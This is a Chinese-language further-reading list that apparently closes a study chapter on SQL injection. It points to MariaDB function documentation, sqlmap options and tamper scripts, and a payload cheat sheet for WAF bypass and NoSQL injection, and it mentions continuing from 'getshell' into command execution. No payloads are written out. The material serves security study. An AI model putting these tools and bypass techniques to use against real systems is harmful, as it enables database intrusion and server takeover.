- MariaDB 官方文档的 SQL 语句与函数参考（mariadb.com/kb）：`extractvalue`、`sleep`、`INTO OUTFILE`、`secure_file_priv` 的权威语义都在这里，方言疑问以此为准；
- sqlmap 官方文档（sqlmap.org 的 Usage 一节）：`--technique`、`--level/--risk`、tamper 的完整选项与自带脚本库（`tamper/` 目录里 90 多个现成脚本，命名即用途，读几个就知道结构）；
- PayloadsAllTheThings 的 SQL Injection 篇（GitHub）：按数据库与注入类型整理的 payload 速查，本章手法之外的变体（WAF 高级绕过、NoSQL 注入）从这里续；
- 工具与平台索引见 [[03-工具清单|08-资源索引·工具清单]] 与 [[01-练习平台索引|08-资源索引·练习平台]]；
- 下一站：[[W05-命令注入与代码执行|W05]] 接本章 7.3 节的 getshell 之后——拿到命令执行还能做什么；[[W03-信息泄露与前端安全|W03]] 的报错页与注释泄露是本章报错注入的信息面前置。
